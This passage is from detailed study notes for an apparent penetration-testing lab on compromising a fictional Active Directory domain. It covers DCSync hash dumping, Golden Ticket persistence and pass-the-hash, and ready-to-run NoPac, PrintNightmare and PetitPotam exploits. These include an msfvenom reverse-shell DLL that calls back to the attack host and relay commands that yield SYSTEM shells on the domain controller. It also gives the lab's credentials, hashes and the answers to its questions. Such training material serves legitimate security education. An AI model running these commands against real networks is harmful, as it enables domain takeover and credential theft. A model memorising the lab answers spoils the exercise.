                              dcsync = specific DCSync attack function
                              pretends to be a DC
                              requests replication from real DC

/domain:INLANEFREIGHT.LOCAL → which domain to target
                              must specify full domain FQDN

/user:INLANEFREIGHT\administrator
                            → which specific user to get hash for
                              we can only get ONE user at a time with Mimikatz
                              = more targeted than secretsdump
                              must include domain\username

Common targets for Mimikatz DCSync:
→ administrator  = highest privilege account
→ krbtgt         = for Golden Ticket persistence
→ specific user  = targeted hash extraction

What you find:

** SAM ACCOUNT **

SAM Username         : administrator
Account Type         : USER_OBJECT
User Account Control : NORMAL_ACCOUNT DONT_EXPIRE_PASSWD
Password last change : 10/27/2021 6:49:32 AM
Object Security ID   : S-1-5-21-...-500
Object Relative ID   : 500  ← RID 500 = always Administrator

Credentials:
  Hash NTLM: 88ad09182de639ccc6579eb0849751cf
             ↑ THIS IS THE NTLM HASH
             = can use for Pass-the-Hash
             = can try to crack offline
             = domain administrator hash = game over

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value: 4625fd0c31368ff4c255a3b876eaac3d
Task 12 - Get krbtgt Hash for Golden Tickets
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\krbtgt

What you find and why it matters:

Credentials:
  Hash NTLM: 16e26ba33e455a8c338142af8d89ffbc

krbtgt is the Kerberos Ticket Granting Ticket account
= Its hash is used to sign ALL Kerberos tickets in the domain
= With this hash we can create GOLDEN TICKETS

Golden Ticket = fake Kerberos TGT
= Signed with krbtgt hash = DC thinks it is real
= Can pretend to be ANY user including Administrator
= Valid for up to 10 years by default
= Works EVEN IF we lose adunn's credentials
= Even IF all other passwords are changed
= Persistence that lasts forever

= This is why krbtgt hash is the most valuable hash
  in any Active Directory environment
7. Understanding the Output Format
NTLM Hash Format Explained
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::

Breaking it down:
inlanefreight.local\administrator  → domain\username
500                                 → RID (Relative Identifier)
                                      500 = always Administrator
aad3b435b51404eeaad3b435b51404ee   → LM hash (legacy, not useful)
                                      this specific value means
                                      LM hash is EMPTY/BLANK
                                      can ignore this
88ad09182de639ccc6579eb0849751cf   → NTLM hash ← THIS IS WHAT WE USE
                                      32 character hex string
                                      use for Pass-the-Hash or cracking
:::                                 → empty fields (history, etc)

How to use the NTLM hash:
Pass-the-Hash:
crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf

Or crack with hashcat:
hashcat -m 1000 admin_hash.txt /usr/share/wordlists/rockyou.txt
(note: mode 1000 = NTLM hash, NOT 13100 which is TGS)
8. Complete Command Reference - All Tasks
bash
# ================================================
# FROM LINUX (secretsdump.py)
# ================================================

# Full DCSync - all hashes
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5

# NTLM hashes only
secretsdump.py -outputfile inlanefreight_hashes -just-dc-ntlm INLANEFREIGHT/adunn@172.16.5.5

# Specific user only
secretsdump.py -just-dc-user administrator INLANEFREIGHT/adunn@172.16.5.5
secretsdump.py -just-dc-user krbtgt INLANEFREIGHT/adunn@172.16.5.5
secretsdump.py -just-dc-user khartsfield INLANEFREIGHT/adunn@172.16.5.5

# With password history and status
secretsdump.py -outputfile inlanefreight_hashes -just-dc -history -pwd-last-set -user-status INLANEFREIGHT/adunn@172.16.5.5

# View the output files
ls inlanefreight_hashes*
cat inlanefreight_hashes.ntds
cat inlanefreight_hashes.ntds.cleartext
cat inlanefreight_hashes.ntds.kerberos
powershell
# ================================================
# FROM WINDOWS (verification)
# ================================================

# Check adunn's info and SID
Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol | fl

# Confirm DCSync rights
$sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType | fl

# Find reversible encryption accounts
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
cmd
# ================================================
# FROM WINDOWS (Mimikatz DCSync)
# ================================================

# Launch PowerShell as adunn
runas /netonly /user:INLANEFREIGHT\adunn powershell

# In new PowerShell window
cd C:\Tools
.\mimikatz.exe
# Inside Mimikatz
privilege::debug

# Get administrator hash
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator

# Get krbtgt hash (for Golden Tickets)
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\krbtgt

# Get specific user hash
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\khartsfield

# Exit
exit
9. Lab Questions - How to Get the Answers
Question 1 - Find User with Reversible Encryption
bash
# On Linux attack host
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5

# Then check cleartext file
cat inlanefreight_hashes.ntds.cleartext

# You will see:
proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
syncron:CLEARTEXT:Mycleart3xtP@ss!   ← this is the answer

# Answer to Q1: syncron
Question 2 - Get syncron's Cleartext Password
bash
# Already visible in cleartext file above
cat inlanefreight_hashes.ntds.cleartext | grep syncron

# Answer to Q2: Mycleart3xtP@ss!
Question 3 - Get khartsfield NTLM Hash
bash
# Option 1: Search in the ntds file
cat inlanefreight_hashes.ntds | grep khartsfield

# Option 2: Target specifically
secretsdump.py -just-dc-user khartsfield INLANEFREIGHT/adunn@172.16.5.5

# You will see:
inlanefreight.local\khartsfield:RID:LMhash:4bb3b317845f0954200a6b0acc9b9f9a:::
                                              ↑
                                    This is the NTLM hash
# Answer to Q3: 4bb3b317845f0954200a6b0acc9b9f9a
10. Key Things to Remember
1. DCSync requires BOTH rights together
   DS-Replication-Get-Changes alone = not enough
   DS-Replication-Get-Changes-All alone = not enough
   BOTH together = full DCSync possible

2. secretsdump.py = easiest way from Linux
   One command = all hashes
   Use -just-dc flag always
   -outputfile saves everything for later use

3. Mimikatz requires runas /netonly first
   Cannot just pass -Credential to Mimikatz
   Must actually launch Mimikatz AS the privileged user
   runas /netonly = network auth as adunn
                    local access still as you

4. Mimikatz = one user at a time
   secretsdump.py = all users at once
   Use secretsdump for bulk dumping
   Use Mimikatz for targeted specific users

5. Three output files from -just-dc flag
   .ntds = NTLM hashes = crack or pass-the-hash
   .ntds.cleartext = plaintext = use directly
   .ntds.kerberos = Kerberos keys = ticket attacks

6. Reversible encryption = instant plaintext
   Some accounts store decryptable passwords
   Find them with:
   Get-ADUser -Filter 'userAccountControl -band 128'
   secretsdump decrypts them automatically
   Check .ntds.cleartext file after dumping

7. krbtgt hash = most valuable hash in domain
   Used to sign ALL Kerberos tickets
   Golden Ticket attack = persistence forever
   Even if all passwords changed = still have access
   Always extract krbtgt during DCSync

8. NTLM hash format for reference
   username:RID:LMhash:NTLMhash:::
   The 4th field = NTLM hash = what we want
   hashcat mode 1000 for cracking NTLM hashes
   NOT 5600 (that is NTLMv2) NOT 13100 (that is TGS)

9. Use -user-status flag for reporting
   Filter disabled accounts from statistics
   Clients want to know active account metrics
   Reporting 500 cracked passwords including 200
   disabled accounts is misleading and unprofessional

10. DCSync is the end goal of most AD attacks
    Every technique we learned leads here:
    LLMNR → hash → credentials
    Password spray → credentials
    Kerberoasting → service account creds
    ACL abuse → adunn
    adunn → DCSync
    DCSync → ALL hashes → Domain Admin
    = Complete domain compromise

Privileged Access, Double Hop, Bleeding Edge Vulnerabilities & Miscellaneous Misconfigurations - Complete Detailed Notes
PART 1: Privileged Access
1. Overview - What is Privileged Access and Why Does It Matter?

After gaining initial credentials in a domain, our next goal is to move laterally to other machines or vertically to higher privilege accounts. Not every path to domain compromise requires local admin rights everywhere. Sometimes a user has specific remote access rights that we can leverage to get onto hosts, find sensitive data, escalate privileges locally, or steal credentials of more powerful users. There are three main types of privileged remote access that we need to enumerate and exploit — Remote Desktop Protocol (RDP), Windows Remote Management (WinRM/PSRemoting), and SQL Server administrative access. Each of these can be enumerated using BloodHound, PowerView, or built-in Windows tools, and each provides a different level of access with different attack possibilities. Even low-privilege remote access is valuable because once we are on a host, we can hunt for stored credentials, sensitive files, or find local privilege escalation vectors that could lead to higher access.

Three Types of Privileged Remote Access:

RDP (Remote Desktop)
→ Port 3389
→ GUI access to remote machine
→ Like physically sitting in front of it
→ BloodHound edge: CanRDP
→ Even non-admin RDP access = very useful

WinRM (Windows Remote Management)
→ Port 5985 (HTTP) or 5986 (HTTPS)
→ Command line access via PowerShell
→ BloodHound edge: CanPSRemote
→ Group: Remote Management Users

SQL Server Admin (SQLAdmin)
→ Port 1433
→ Database access
→ Often leads to OS command execution
→ BloodHound edge: SQLAdmin
→ SeImpersonatePrivilege = path to SYSTEM
2. Remote Desktop Protocol (RDP)
What is RDP and Why Do We Care?

RDP is a Microsoft protocol that provides full graphical remote access to a Windows machine as if you were physically sitting in front of it. From a penetration testing perspective, having RDP access to a machine gives us enormous flexibility — we can launch tools with a full GUI, interact with applications, browse files visually, and generally have a much more comfortable environment to work in compared to a command line shell. More importantly, if privileged users are logged into a machine we can RDP to, we may be able to steal their session or find their credentials left in memory or files. Even if we only have regular user RDP access, we are on the machine and can look for local privilege escalation opportunities.

Task 1 - Enumerate RDP Users with PowerView
powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

Breaking down:

Get-NetLocalGroupMember         → PowerView function
                                  lists members of a local group
                                  on a REMOTE computer

-ComputerName ACADEMY-EA-MS01  → which machine to check
                                  can use hostname or IP

-GroupName "Remote Desktop Users"
                                → which local group to enumerate
                                  Remote Desktop Users = who can RDP
                                  to this specific machine

What you find:

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Desktop Users
MemberName   : INLANEFREIGHT\Domain Users
SID          : S-1-5-21-...-513
IsGroup      : True
IsDomain     : UNKNOWN

= Domain Users group is in Remote Desktop Users
= ALL domain users can RDP to this machine
= This is a significant misconfiguration
= Any compromised domain account = RDP access here
= Many users could be active on this machine
= Potential to find sensitive data or steal sessions
Task 2 - Check RDP Rights in BloodHound
In BloodHound:
Analysis tab → "Find Workstations where Domain Users can RDP"
Analysis tab → "Find Servers where Domain Users can RDP"

Or check specific user:
Click on wley → Node Info tab
Scroll to Execution Rights
Look for CanRDP entries

BloodHound Cypher Query for RDP:

cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) 
MATCH p2=(u1)-[:CanRDP*1..]->(c:Computer) 
RETURN p2
Task 3 - Connect via RDP from Linux
bash
# Using xfreerdp
xfreerdp /u:forend /p:Klmcargo2 /d:INLANEFREIGHT.LOCAL /v:172.16.5.25

# Or using Remmina (GUI tool)
remmina
3. WinRM (Windows Remote Management)
What is WinRM and Why Do We Care?

WinRM is Microsoft's implementation of the WS-Management protocol and allows administrators to remotely manage Windows machines using PowerShell. Unlike RDP which gives GUI access, WinRM gives you a PowerShell command line on the remote machine. The Remote Management Users group was created specifically to allow WinRM access without granting full local admin rights, which means we may find users who can connect via WinRM but cannot do everything a local admin can. This is still very useful because we get a shell on the machine and can run PowerShell commands, hunt for data, and potentially escalate privileges. WinRM also supports running commands without a full interactive session using Invoke-Command which can be useful for lateral movement.

Task 4 - Enumerate WinRM Users with PowerView
powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

What you find:

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Management Users
MemberName   : INLANEFREIGHT\forend
SID          : S-1-5-21-...-5614
IsGroup      : False
IsDomain     : UNKNOWN

= forend user specifically has WinRM access
= forend is NOT a local admin (no Pwn3d!)
= but can connect via WinRM
= can run PowerShell remotely
= useful for further enumeration
Task 5 - BloodHound Cypher Query for WinRM
cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) 
MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) 
RETURN p2

What you find:

Visual graph showing:
FOREND → CanPSRemote → ACADEMY-EA-MS01

= forend can connect via WinRM to MS01
= Save this as custom query in BloodHound
  for future assessments
Task 6 - Connect via WinRM from Windows (Enter-PSSession)
powershell
# Create credential object for forend
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)

# Establish WinRM session
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred

What you get:

[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents>
↑
You are now on ACADEMY-EA-MS01
Running as forend
Interactive PowerShell session
Can run commands, browse files, hunt for data

To exit:
[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> Exit-PSSession
Task 7 - Connect via WinRM from Linux (Evil-WinRM)
bash
# Install evil-winrm if needed
gem install evil-winrm

# Connect to target
evil-winrm -i 10.129.201.234 -u forend
# Enter password when prompted: Klmcargo2

# Or specify password directly
evil-winrm -i 10.129.201.234 -u forend -p Klmcargo2

# Connect with NTLM hash (Pass-the-Hash)
evil-winrm -i 10.129.201.234 -u forend -H [NTLM_HASH]

What you get:

*Evil-WinRM* PS C:\Users\forend.INLANEFREIGHT\Documents>
↑
Connected to the machine
Full PowerShell session
Can run all PowerShell commands
Can upload/download files
Can load PowerShell scripts

Check hostname to confirm connection:
*Evil-WinRM* PS C:\Users\forend.INLANEFREIGHT\Documents> hostname
ACADEMY-EA-MS01
4. SQL Server Admin Access
What is SQL Admin and Why Do We Care?

SQL Server administrative access (sysadmin role) on a Microsoft SQL Server instance is one of the most powerful forms of access we can obtain because it almost always leads to SYSTEM level command execution on the underlying operating system. This is because SQL Server has a stored procedure called xp_cmdshell that allows the execution of operating system commands through the SQL Server service account. SQL Server services typically run with elevated privileges and often have the SeImpersonatePrivilege right which can be leveraged with tools like JuicyPotato or PrintSpoofer to escalate to SYSTEM. We can find SQL admin access through BloodHound, Kerberoasting service accounts with MSSQL SPNs, finding credentials in config files, or through password spraying.

Task 8 - Find SQL Admin Rights in BloodHound
cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) 
MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) 
RETURN p2

What you find:

damundsen → SQLAdmin → ACADEMY-EA-DB01

= damundsen has sysadmin rights on the SQL server
= This means OS command execution is possible
= High value target
Task 9 - Enumerate MSSQL Instances with PowerUpSQL
powershell
# Import PowerUpSQL
cd .\PowerUpSQL\
Import-Module .\PowerUpSQL.ps1

# Find all SQL instances in the domain
Get-SQLInstanceDomain

Breaking down:

Get-SQLInstanceDomain           → PowerUpSQL function
                                  queries AD for all accounts
                                  with MSSQL SPNs registered
                                  finds all SQL Server instances
                                  in the domain automatically

What you find:

ComputerName  : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
Instance      : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
DomainAccount : damundsen
Service       : MSSQLSvc
Spn           : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433

= SQL Server found on ACADEMY-EA-DB01
= Port 1433 = standard SQL port
= damundsen is the service account
= We have damundsen's credentials from ACL abuse
= We can authenticate and run queries
Task 10 - Run SQL Query with PowerUpSQL
powershell
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

Breaking down:

Get-SQLQuery                    → PowerUpSQL function
                                  runs SQL queries against instances

-Verbose                        → show detailed connection info

-Instance "172.16.5.150,1433"  → IP,Port of SQL server

-username "inlanefreight\damundsen"
                                → domain\username format

-password "SQL1234!"            → password for authentication

-query 'Select @@version'      → SQL query to run
                                  @@version = SQL Server version
                                  confirms we have connectivity

What you find:

VERBOSE: 172.16.5.150,1433 : Connection Success.

Column1
-------
Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64)

= Connected successfully
= SQL Server 2017 identified
= Ready for more advanced commands
Task 11 - Connect to MSSQL from Linux (mssqlclient.py)
bash
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth

Breaking down:

mssqlclient.py                  → Impacket tool for SQL connections

INLANEFREIGHT/DAMUNDSEN         → DOMAIN/USERNAME

@172.16.5.150                   → SQL Server IP

-windows-auth                   → use Windows/AD authentication
                                  NOT SQL Server authentication
                                  = use domain credentials
                                  Required for domain accounts

What you get after connecting:

SQL>
↑
Interactive SQL shell
Type help for available commands
Task 12 - Enable xp_cmdshell and Run OS Commands
sql
-- Enable xp_cmdshell
SQL> enable_xp_cmdshell

-- Run operating system commands
SQL> xp_cmdshell whoami /priv

What you find:

Privilege Name                Description                          State
============================= ==================================== ========
SeImpersonatePrivilege        Impersonate a client after auth      Enabled
SeAssignPrimaryTokenPrivilege Replace a process level token        Disabled
SeManageVolumePrivilege       Perform volume maintenance tasks     Enabled

= SeImpersonatePrivilege is ENABLED
= This is a path to SYSTEM level access
= Use JuicyPotato, PrintSpoofer, or RoguePotato
= to escalate from SQL service account to SYSTEM
= Then dump credentials, create local admin
= Fully compromised the database server
PART 2: Kerberos Double Hop Problem
5. What is the Double Hop Problem?

The Double Hop problem is one of the most frustrating issues you will encounter when using WinRM for lateral movement. It occurs when you connect via WinRM to Machine A and then try to access resources on Machine B or the Domain Controller from within that WinRM session. The problem happens because of how Kerberos authentication works. When you connect via WinRM, you receive a Kerberos TGS ticket specifically for the WinRM service on Machine A. This ticket only proves your identity TO Machine A. It does NOT contain your TGT which is what you would need to prove your identity to Machine B or the DC. So when PowerView tries to query the DC from within your WinRM session, the DC refuses because it cannot verify who you are.

The Double Hop Problem Visualized:

Normal Working Authentication (RDP or PSExec):
Attack Host → Machine A
Your password/NTLM hash is in memory
Machine A → DC "authenticate me"
DC recognizes the hash in memory → OK
Machine A → DC (works fine)

WinRM Double Hop (BROKEN):
Attack Host → Machine A (via WinRM)
Only TGS ticket for WinRM service is created
NO TGT or password stored in memory
Machine A → DC "who are you?"
DC "I have no idea, rejected"
= Cannot access DC resources from WinRM session

Visual:
Attack Host ──WinRM──→ Machine A ──BLOCKED──→ DC
                        ↑
                    Only has TGS for WinRM
                    NOT TGT for further auth
                    = Cannot hop to next machine
Task 13 - See the Problem in Action
powershell
# Connect to remote host
Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm

# Inside the session, check what tickets are cached
[DEV01]: PS C:\Users\backupadm\Documents> klist

What you find:

Cached Tickets: (1)

#0> Client: backupadm @ INLANEFREIGHT.LOCAL
    Server: academy-aen-ms0$ @
    KerbTicket: AES-256-CTS-HMAC-SHA1-96
    Cache Flags: 0x4 -> S4U

= Only ONE ticket = for the WinRM service on this machine
= NO TGT = cannot authenticate to other services
= No krbtgt ticket = cannot talk to DC
powershell
# Try to run PowerView = FAILS
[DEV01]: PS C:\Users\backupadm\Documents> Import-Module .\PowerView.ps1
[DEV01]: PS C:\Users\backupadm\Documents> get-domainuser -spn

Exception calling "FindAll" with "0" argument(s): 
"An operations error occurred."
↑
= FAILED because cannot reach DC
= Double Hop problem confirmed
6. Workaround 1 - PSCredential Object (Evil-WinRM)

This workaround creates a PSCredential object inside the WinRM session and explicitly passes those credentials with every PowerView command that needs to talk to the DC. It is slightly more work because you must add -Credential $Cred to every command, but it works perfectly with evil-winrm sessions.

powershell
# Inside evil-winrm session on remote host
# Create credential object explicitly
$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)

# Now use -credential flag with PowerView commands
get-domainuser -spn -credential $Cred | select samaccountname

What you find now (works):

samaccountname
--------------
azureconnect
backupjob
krbtgt
mssqlsvc
sqltest
sqldev
= SUCCESS = PowerView can now reach the DC
= Because we explicitly passed credentials
= DC can now verify who we are
= Double hop bypassed via credential injection

Without -credential flag (still fails):
get-domainuser -spn | select samaccountname
→ Exception calling "FindAll": operations error
= Fails without explicit credentials
7. Workaround 2 - Register PSSession Configuration (Windows)

This workaround is more permanent and elegant but requires a proper PowerShell console on Windows (not evil-winrm). It registers a new PSSession configuration that impersonates the privileged user for all requests, meaning you do not need to pass credentials with every command.

powershell
# On your Windows attack host (not in a session yet)
# Register a new PSSession config that runs as privileged user
Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm

Breaking down:

Register-PSSessionConfiguration → creates new WinRM endpoint
                                  with special authentication settings

-Name backupadmsess             → name for this new configuration
                                  we reference this name when connecting

-RunAsCredential inlanefreight\backupadm
                                → ALL commands in sessions using
                                  this config will run AS backupadm
                                  the local machine impersonates backupadm
                                  ALL requests go to DC as backupadm
                                  = double hop solved permanently
powershell
# Restart WinRM service (kicks you out if in a session)
Restart-Service WinRM

# Connect using the new named configuration
Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName backupadmsess

Verify double hop is fixed:

powershell
[DEV01]: PS C:\Users\backupadm\Documents> klist

Cached Tickets: (1)
#0> Client: backupadm @ INLANEFREIGHT.LOCAL
    Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
    Cache Flags: 0x1 -> PRIMARY

= NOW we have a TGT (krbtgt ticket)
= NOT just a WinRM service ticket
= Can now talk to DC directly
= Double hop problem solved

[DEV01]: PS C:\Users\Public> get-domainuser -spn | select samaccountname
samaccountname
--------------
azureconnect
backupjob
krbtgt
mssqlsvc
= Works perfectly without -credential flag

Important limitations:

Cannot use Register-PSSessionConfiguration from evil-winrm
→ Requires GUI/proper PowerShell console
→ Cannot get the credential popup in evil-winrm

Cannot use from Linux PowerShell either
→ Kerberos limitations on Linux PowerShell

Best used when:
→ You have RDP access to a Windows host
→ Working from Windows attack machine
→ You have set of credentials to impersonate
PART 3: Bleeding Edge Vulnerabilities
8. NoPac (SamAccountName Spoofing) - CVE-2021-42278 & CVE-2021-42287
What is NoPac?

NoPac is one of the most impactful AD vulnerabilities discovered in recent years. It combines two CVEs to allow any standard domain user to escalate all the way to Domain Admin in a single command. CVE-2021-42278 is a bypass in the Security Account Manager that allows renaming computer accounts to match Domain Controller names. CVE-2021-42287 is a Kerberos PAC vulnerability that causes the KDC to issue tickets under the DC's name when a renamed account requests them. Together, you create a fake machine account, rename it to match a DC, request a ticket, and end up with a TGT that the DC thinks belongs to itself. This gives you impersonation of the DC and effectively Domain Admin access.

NoPac Attack Flow (Simple):
1. Create a new computer account (any domain user can do this
   up to 10 times by default via ms-DS-MachineAccountQuota)
2. Rename the computer account to match DC name (WIN-DC01$)
3. Request Kerberos ticket for this account
4. DC gets confused = issues ticket as if it IS the DC
5. We have a ticket impersonating the DC
6. Use ticket to perform DCSync or get SYSTEM shell
= Domain Admin from standard user = single command
Task 14 - Scan for NoPac Vulnerability
bash
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

Breaking down:

scanner.py                      → NoPac scanner script
inlanefreight.local/forend      → domain/username
:Klmcargo2                      → password
-dc-ip 172.16.5.5              → Domain Controller IP
-use-ldap                       → use LDAP for enumeration

What you find:

[*] Current ms-DS-MachineAccountQuota = 10
→ We CAN add computer accounts (quota is 10)
→ If this is 0 = attack fails
→ Admin may have set to 0 to prevent this attack

[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
→ Successfully got tickets
→ System IS vulnerable to NoPac
→ Proceed with exploitation
Task 15 - Run NoPac to Get SYSTEM Shell on DC
bash
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

Breaking down:

noPac.py                        → the exploit script

INLANEFREIGHT.LOCAL/forend:Klmcargo2
                                → standard domain user credentials
                                  just a regular user = that is all needed

-dc-ip 172.16.5.5              → Domain Controller IP

-dc-host ACADEMY-EA-DC01       → DC hostname (must match -dc-ip)

-shell                          → give us an interactive shell
                                  uses smbexec for command execution

--impersonate administrator    → impersonate the built-in admin
                                  could also impersonate other accounts

-use-ldap                       → use LDAP for enumeration

What you find:

[*] Adding Computer Account "WIN-LWJFQMAXRVN$"
→ Created fake computer account

[*] WIN-LWJFQMAXRVN$ sAMAccountName == ACADEMY-EA-DC01
→ Renamed fake account to match DC name

[*] Saving ticket in ACADEMY-EA-DC01.ccache
→ Saved ticket that impersonates DC

[*] Impersonating administrator
→ Using DC ticket to get admin ticket

C:\Windows\system32>
↑
SYSTEM SHELL ON THE DOMAIN CONTROLLER
= Domain Admin achieved from regular user
= Full domain compromise in one command
Task 16 - NoPac DCSync (Alternative)
bash
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator

Breaking down:

-dump                           → instead of shell, perform DCSync
                                  dump credentials from the domain

-just-dc-user INLANEFREIGHT/administrator
                                → only get the administrator hash
                                  targeted extraction

What you find:

inlanefreight.local\administrator:500:aad3b435...:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d...

= Got administrator NTLM hash AND Kerberos keys
= Can now Pass-the-Hash as administrator
= Or crack the hash offline
9. PrintNightmare (CVE-2021-34527 & CVE-2021-1675)
What is PrintNightmare?

PrintNightmare is a critical vulnerability in the Windows Print Spooler service which runs on all Windows machines by default. The vulnerability allows remote code execution because the Print Spooler runs as SYSTEM and can be tricked into loading a malicious DLL from an SMB share we control. The attack involves creating a DLL payload with msfvenom, hosting it on an SMB share, and then triggering the Print Spooler on the DC to load our DLL, giving us SYSTEM level code execution on the Domain Controller.

Task 17 - Check if Print Spooler is Exposed
bash
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

What you find:

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
Protocol: [MS-RPRN]: Print System Remote Protocol

= Both print protocols exposed
= Print Spooler is running and accessible
= Target is vulnerable to PrintNightmare
Task 18 - Create DLL Payload
bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

Breaking down:

msfvenom                        → Metasploit payload generator
-p windows/x64/meterpreter/reverse_tcp
                                → payload type
                                  meterpreter = advanced shell
                                  reverse_tcp = calls back to us

LHOST=172.16.5.225             → our Linux attack host IP
                                  where the shell calls back to

LPORT=8080                      → port to listen on

-f dll                          → output as DLL file format
                                  required for Print Spooler exploit

> backupscript.dll              → save to this filename
Task 19 - Host DLL on SMB Share
bash
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

Breaking down:

smbserver.py                    → Impacket SMB server
-smb2support                    → enable SMB2 protocol
                                  required for modern Windows
CompData                        → name of the share
                                  DC will connect to \\ourIP\CompData
/path/to/backupscript.dll      → directory containing our DLL
Task 20 - Setup Metasploit Handler
bash
# In Metasploit console
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 172.16.5.225
set LPORT 8080
run
Task 21 - Run PrintNightmare Exploit
bash
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'

Breaking down:

CVE-2021-1675.py                → PrintNightmare exploit script

inlanefreight.local/forend:Klmcargo2
                                → just a standard domain user
                                  no admin rights needed

@172.16.5.5                     → target DC IP

'\\172.16.5.225\CompData\backupscript.dll'
                                → UNC path to our malicious DLL
                                  DC's Print Spooler loads this
                                  as SYSTEM = we get SYSTEM shell

What you find:

Meterpreter session 1 opened (172.16.5.225:8080 -> 172.16.5.5:58048)

(Meterpreter 1)(C:\Windows\system32) > shell
C:\Windows\system32>whoami
nt authority\system

= SYSTEM shell on Domain Controller
= Full domain compromise
= From standard domain user credentials
10. PetitPotam (CVE-2021-36942)
What is PetitPotam?

PetitPotam is an NTLM relay attack that exploits the MS-EFSRPC (Encrypting File System Remote Protocol) to coerce a Domain Controller to authenticate to an attacker-controlled host. The attack is especially powerful when Active Directory Certificate Services (AD CS) is deployed because the authentication from the DC can be relayed to the CA Web Enrollment page to obtain a certificate for the DC machine account. This certificate can then be used to get a TGT for the DC machine account and perform a DCSync attack for full domain compromise. Critically, PetitPotam does not require any domain credentials in its original unpatched form.

Task 22 - Start ntlmrelayx to Capture Certificate
bash
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

Breaking down:

ntlmrelayx.py                   → Impacket NTLM relay tool
                                  intercepts NTLM auth and relays it

-debug                          → show detailed output

-smb2support                    → support SMB2 protocol

--target http://ACADEMY-EA-CA01...
                                → relay captured auth TO this target
                                  = the CA Web Enrollment page
                                  WHERE we send the DC's credentials

--adcs                          → AD CS mode
                                  tells ntlmrelayx to request
                                  a certificate from the CA

--template DomainController    → use this certificate template
                                  DomainController template
                                  creates cert for DC machine account

Result: when DC authenticates to us
→ We relay its auth to the CA
→ CA thinks DC is requesting a cert
→ CA issues certificate to DC machine account
→ We capture that certificate
Task 23 - Run PetitPotam to Coerce DC Authentication
bash
python3 PetitPotam.py 172.16.5.225 172.16.5.5

Breaking down:

PetitPotam.py                   → the exploit script

172.16.5.225                    → OUR attack host IP
                                  DC will authenticate TO this IP
                                  where ntlmrelayx is listening
